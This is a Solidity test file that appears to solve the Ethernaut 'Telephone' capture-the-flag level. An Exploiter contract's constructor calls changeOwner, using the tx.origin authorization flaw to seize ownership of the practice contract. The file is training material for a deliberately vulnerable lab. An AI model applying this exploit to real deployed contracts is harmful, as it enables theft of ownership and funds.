// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Telephone.sol";
import "src/levels/TelephoneFactory.sol";

contract TestTelephone is BaseTest {
    Telephone private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new TelephoneFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Telephone(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        vm.startPrank(player);
        Exploiter exp = new Exploiter(address(player), level);
        vm.stopPrank();
    }
}

contract Exploiter {
    constructor(address target, Telephone telephone) public {
        telephone.changeOwner(target);
    }
}
